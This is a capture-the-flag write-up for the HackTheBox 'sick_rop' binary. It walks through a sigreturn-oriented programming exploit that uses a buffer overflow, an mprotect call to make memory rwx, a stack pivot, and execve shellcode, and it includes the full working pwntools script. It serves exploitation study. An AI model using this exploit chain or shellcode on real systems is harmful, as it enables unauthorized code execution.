# SROP Challenge 
## Overview
**Note:** I did not create this challenge, it was made and published on HackTheBox.

Running checksec on the executable provides the following output:

```shell
iqimpz@ubuntu:~/$ checksec ./sick_rop
[*] '/root/htb/challenges/sick_rop/sick_rop'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The only protection in places is a non-executable stack. Which means we will not be writing shellcode to the stack to execute it.

## Code Analysis

Disassembly of section .text:

```
0000000000401000 <read>:
  401000:	b8 00 00 00 00       	mov    eax,0x0
  401005:	bf 00 00 00 00       	mov    edi,0x0
  40100a:	48 8b 74 24 08       	mov    rsi,QWORD PTR [rsp+0x8]
  40100f:	48 8b 54 24 10       	mov    rdx,QWORD PTR [rsp+0x10]
  401014:	0f 05                	syscall 
  401016:	c3                   	ret    

0000000000401017 <write>:
  401017:	b8 01 00 00 00       	mov    eax,0x1
  40101c:	bf 01 00 00 00       	mov    edi,0x1
  401021:	48 8b 74 24 08       	mov    rsi,QWORD PTR [rsp+0x8]
  401026:	48 8b 54 24 10       	mov    rdx,QWORD PTR [rsp+0x10]
  40102b:	0f 05                	syscall 
  40102d:	c3                   	ret    

000000000040102e <vuln>:
  40102e:	55                   	push   rbp
  40102f:	48 89 e5             	mov    rbp,rsp
  401032:	48 83 ec 20          	sub    rsp,0x20
  401036:	49 89 e2             	mov    r10,rsp
  401039:	68 00 03 00 00       	push   0x300
  40103e:	41 52                	push   r10
  401040:	e8 bb ff ff ff       	call   401000 <read>
  401045:	50                   	push   rax
  401046:	41 52                	push   r10
  401048:	e8 ca ff ff ff       	call   401017 <write>
  40104d:	c9                   	leave  
  40104e:	c3                   	ret    

000000000040104f <_start>:
  40104f:	e8 da ff ff ff       	call   40102e <vuln>
  401054:	eb f9                	jmp    40104f <_start>

```

So this is a very simple program with very few instructions. It runs in an infinite loop running the `vuln()` function. The instruction at `401032` allocates a buffer of **0x20** bytes on the stack. Next, `read()` is called to read **0x300** bytes into that buffer.  `vuln()` then calls `write()` to write the contents of that buffer back to stdin.

There is an obvious BOF when reading user input into the size **0x20** buffer. with the `syscall; ret` gadget, you may be thinking, just call `execve("/bin/sh")`. But there are no `pop rdi` gadgets so we wouldn't even be able to get our command string into the correct register. But there is another way!

## Exploit

All we need for SROP is a relativly large BOF, a `syscall; ret;` gadget, and a way to control RAX (We need RAX to have the value of `0xf` for the `rt_sigreturn` syscall).  We already have the first two, but there is no `pop rax` gadget. But there is another way to control RAX. The `read` syscall returns the number of bytes read in RAX. But we come across another problem. 

When sending our BOF payload, it will be alot more than 0xf bytes, so RAX will have the wrong value when we call `syscall`. But at the point that `vuln()` returns, we have control of the program thanks to our BOF, so we can jump directly to `vuln()` so that we can `read()` more data, then send a 15 byte payload (set RAX == 0xf), and then continue with SROP.

Since we would need a pointer to the string `/bin/sh`, we still can't call `execve("/bin/sh")`. And the stack isn't executable so we cannot place shellcode there, but we can call the `mprotect` syscall to map some memory as rwx, then pivot the stack to that location so that we can easily write shellcode to it then jump to it.

Below is our exploit:

```python
#!/usr/bin/python
import sys
from pwn import *
from time import sleep

elf = ELF('./sick_rop')
p = elf.process()
context.clear(arch='amd64')

vuln = 0x40102e
vuln_pointer = 0x4010d8								#you can get this with `find 0x40102e` in gdb-peda
offset = 40
writable = 0x401000
start = 0x40104f
read = 0x401000
syscall = 0x401014
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"		#shellcode from http://shell-storm.org/shellcode/files/shellcode-806.php

#gdb.attach(p)										#used for debugging.

payload = b'A'*offset + p64(vuln) + p64(syscall)	#Overflow buff, return to vuln to make another call to read to send payload2, return to syscall with eax set to 0xf from paylaod2


frame = SigreturnFrame()
frame.rax = 0xa 									#0xa is syscall number for mprotect
frame.rdi = writable								#text segment where we want to mark as rwx
frame.rsi = 0x1000 									#mark 0x1000 bytes as rwx
frame.rdx = 0x7 									#rwx
frame.rsp = vuln_pointer 							#pivots stack to the text segment that was just marked as rwx. Must use pointer to vuln instead of actual address of vuln, because passing an address to rsp doesn't allow it to be "resolved", this is why we set rsp to a pointer to vuln.
frame.rip = syscall

payload += bytes(frame)
p.send(payload)

payload2 = 'B'*14
sleep(0.5)
p.recvline()
p.sendline(payload2)								#this send 14+\n (15) bytes to read syscall. Read syscall returns bytes read, to the RAX register. So now 15 is in RAX and the next syscall will be sigreturn
sleep(0.5)

p.recvline()
payload3 = 'C'*(offset - 4) + 'DDDD'
payload3 += p64(0x4010e8)							#address of the shellcode, found with gdb
payload3 += shellcode
p.send(payload3)
p.interactive()
```

First we use the BOF to call `read()` so that we can send 15 bytes to set RAX to 0xf then return to our syscall gadget that then calls `rt_sigreturn`.

I used pwntools `SigreturnFrame()` to generate a fake signal frame and replaced the needed registers with the appropreate values to call mprotect, making 0x1000 bytes rwx starting at 0x41000. Then the sigreturn pivots the stack to that rwx memory. 

We then use the BOF Again to write shellcode to the new stack, then jump there and execute it for a shell!